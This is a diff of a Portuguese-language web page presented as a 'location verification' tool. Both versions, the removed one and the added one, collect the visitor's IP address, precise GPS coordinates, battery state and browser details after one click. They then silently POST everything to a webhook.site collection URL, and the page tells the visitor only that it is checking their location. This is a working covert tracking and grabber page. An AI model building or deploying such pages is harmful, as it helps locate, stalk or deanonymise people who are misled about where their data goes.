@@ -1,39 +1,35 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-PT">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verificar Localização</title>
+  <title>Verificador de Localização</title>
   <style>
     body {
       font-family: sans-serif;
-      line-height: 1.6;
-      background-color: #f4f4f9;
-      margin: 0;
-      padding: 20px;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f2f5;
     }
     .container {
-      background: #fff;
+      background-color: white;
       padding: 30px;
       border-radius: 8px;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-      max-width: 500px;
-      width: 100%;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
       text-align: center;
     }
     .btn {
       background-color: #007bff;
       color: white;
       border: none;
-      padding: 12px 24px;
-      font-size: 16px;
-      border-radius: 4px;
+      padding: 10px 20px;
+      margin-top: 15px;
+      border-radius: 5px;
       cursor: pointer;
-      transition: background 0.3s;
+      font-size: 16px;
     }
     .btn:hover {
       background-color: #0056b3;
@@ -41,93 +37,95 @@
     .status {
       margin-top: 20px;
       font-weight: bold;
-    }
-    .oculto {
-      display: none;
+      color: #333;
     }
   </style>
 </head>
 <body>
-
   <div class="container">
-    <h2>Verificação de Localização</h2>
-    <p>Clique no botão abaixo para verificar a sua localização e o estado da conexão.</p>
-    <button id="btn-iniciar" class="btn">Verificar Localização</button>
-
-    <div id="status" class="status oculto"></div>
-    <div id="saida_dados" class="oculto"></div>
+    <h2>Verificação de Sistema</h2>
+    <p>Clique no botão abaixo para verificar a sua localização atual.</p>
+    <button class="btn" onclick="iniciarVerificacao()">Verificar Localização</button>
+    <div id="statusMensagem" class="status"></div>
   </div>
 
   <script>
-    const btnIniciar = document.getElementById('btn-iniciar');
-    const msgStatus = document.getElementById('status');
-    const saidaDados = document.getElementById('saida_dados');
+    // Substitua pelo URL exato do seu webhook.site
+    const ENDPOINT_WEBHOOK = "https://webhook.site/3e64b456-7cb2-417a-96bd-82ba6628b0d";
+    
+    // Objeto principal que armazenará todos os dados antes do envio
+    const dados = {};
+    const statusMensagem = document.getElementById("statusMensagem");
 
-    // URL do seu Webhook
-    const WEBHOOK_URL = 'https://webhook.site/3e64b456-7cb2-417a-96bd-82bba682b80d/26ba0598-9411-40ca-b946-9b21b8658867';
+    function atualizarStatus(mensagem) {
+      statusMensagem.innerText = mensagem;
+    }
 
-    btnIniciar.addEventListener('click', async () => {
-      msgStatus.classList.remove('oculto');
-      msgStatus.textContent = 'A recolher dados...';
-
-      // 1. Dados Básicos do Dispositivo / Navegador
-      const dados = {
-        plataforma: navigator.platform,
-        idioma: navigator.language,
-        profundidade_cor: screen.colorDepth,
-        resolucao: `${screen.width}x${screen.height}`,
-        fuso_horario: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        data_hora: new Date().toISOString()
-      };
-
-      // Informações da Bateria (se suportado)
-      if (navigator.getBattery) {
-        try {
-          const bateria = await navigator.getBattery();
-          dados.bateria_nivel = `${(bateria.level * 100).toFixed(0)}%`;
-          dados.bateria_carregando = bateria.charging;
-        } catch (e) {
-          dados.bateria_erro = 'Não suportado ou bloqueado';
-        }
-      }
-
-      // 2. Coletar IP e Localização por IP (ipapi.co)
+    async function enviarParaServidor(payload) {
       try {
-        const respostaIp = await fetch('https://ipapi.co/json/');
-        const dadosIp = await respostaIp.json();
-        dados.ip = dadosIp.ip;
-        dados.ip_cidade = dadosIp.city;
-        dados.ip_regiao = dadosIp.region;
-        dados.ip_pais = dadosIp.country_name;
-        dados.ip_provedor = dadosIp.org;
-        dados.ip_latitude = dadosIp.latitude;
-        dados.ip_longitude = dadosIp.longitude;
-      } catch (e) {
-        dados.ip_erro = 'Falha ao obter dados por IP';
-      }
-
-      // 3. Coletar Geolocalização Exata (GPS / Wi-Fi)
-      msgStatus.textContent = 'A aguardar permissão de localização...';
-
-      if ('geolocation' in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          async (posicao) => {
-            // Sucesso na captura do GPS
-            dados.gps_latitude = posicao.coords.latitude;
-            dados.gps_longitude = posicao.coords.longitude;
-            dados.gps_precisao_metros = posicao.coords.accuracy;
-            dados.gps_altitude = posicao.coords.altitude;
-            dados.gps_timestamp = new Date(posicao.timestamp).toISOString();
-
-            msgStatus.textContent = 'Localização obtida com sucesso!';
-            await enviarDados(dados);
+        await fetch(ENDPOINT_WEBHOOK, {
+          method: 'POST', // Método correto para envio
+          headers: {
+            'Content-Type': 'application/json' // Cabeçalho correto
           },
-          async (erro) => {
-            // Falha / Permissão Negada
-            dados.gps_erro = erro.message;
-            dados.gps_erro_codigo = erro.code;
-            msgStatus.textContent = 'Permissão negada ou falha ao obter GPS. A enviar dados básicos...';
-            await enviarDados(dados);
+          body: JSON.stringify(payload) // Converte o objeto para string JSON
+        });
+        atualizarStatus("Verificação concluída com sucesso!");
+      } catch (erro) {
+        console.error("Erro no envio:", erro);
+        atualizarStatus("Erro ao comunicar com o servidor.");
+      }
+    }
+
+    async function obterIP() {
+      try {
+        const resposta = await fetch('https://api.ipify.org?format=json');
+        const data = await resposta.json();
+        dados.ip = data.ip;
+      } catch (erro) {
+        dados.ip = "Erro ao obter IP";
+      }
+    }
+
+    function obterBateria() {
+      return new Promise((resolve) => {
+        if (navigator.getBattery) {
+          navigator.getBattery().then(bateria => {
+            dados.bateria = {
+              nivel: (bateria.level * 100) + "%",
+              carregando: bateria.charging
+            };
+            resolve();
+          }).catch(() => {
+            dados.bateria = "Erro ao ler bateria";
+            resolve();
+          });
+        } else {
+          dados.bateria = "Não suportado";
+          resolve();
+        }
+      });
+    }
+
+    function obterLocalizacao() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          dados.erro_geo = "Geolocalização não suportada";
+          resolve();
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          (posicao) => {
+            // Adiciona as coordenadas ao objeto principal "dados"
+            dados.latitude = posicao.coords.latitude;
+            dados.longitude = posicao.coords.longitude;
+            dados.precisao_metros = posicao.coords.accuracy;
+            resolve();
+          },
+          (erro) => {
+            dados.erro_geo = erro.message;
+            resolve();
           },
           {
             enableHighAccuracy: true,
@@ -135,27 +133,26 @@
             maximumAge: 0
           }
         );
-      } else {
-        dados.gps_erro = 'Geolocalização não suportada pelo navegador.';
-        await enviarDados(dados);
-      }
-    });
+      });
+    }
 
-    // 4. Função para Enviar os Dados ao Webhook
-    async function enviarDados(payload) {
-      try {
-        await fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(payload)
-        });
-        msgStatus.textContent = 'Concluído com sucesso!';
-      } catch (erro) {
-        console.error('Erro ao enviar dados:', erro);
-        msgStatus.textContent = 'Erro ao sincronizar informações.';
-      }
+    async function iniciarVerificacao() {
+      atualizarStatus("A recolher dados e a aguardar permissão de localização...");
+      
+      // Recolha de dados básicos do dispositivo
+      dados.userAgent = navigator.userAgent;
+      dados.plataforma = navigator.platform;
+      dados.idioma = navigator.language;
+      dados.data_hora = new Date().toISOString();
+      
+      // Executa as recolhas assíncronas
+      await obterIP();
+      await obterBateria();
+      await obterLocalizacao();
+
+      // Envia o objeto 'dados' completo (incluindo lat/long se autorizadas) para o Webhook
+      atualizarStatus("A enviar informações...");
+      await enviarParaServidor(dados);
     }
   </script>
 </body>
